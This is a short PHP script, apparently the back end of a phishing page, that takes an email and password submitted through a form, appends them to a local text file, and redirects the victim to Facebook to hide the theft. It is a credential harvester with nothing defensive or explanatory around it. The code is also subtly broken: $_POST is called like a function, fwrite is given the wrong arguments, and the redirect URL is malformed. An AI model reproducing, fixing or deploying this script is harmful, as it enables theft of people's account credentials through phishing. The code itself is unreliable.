<?php
$email = $_POST("email");
$pass = $_POST("pass");
$fichero = fopen("cuen.txt","a");
fwrite($fichero,"$email",PHP_EOL);
fwrite($fichero,"$pass",PHP_EOL);
header("location: https//:www.facebook.com");
?>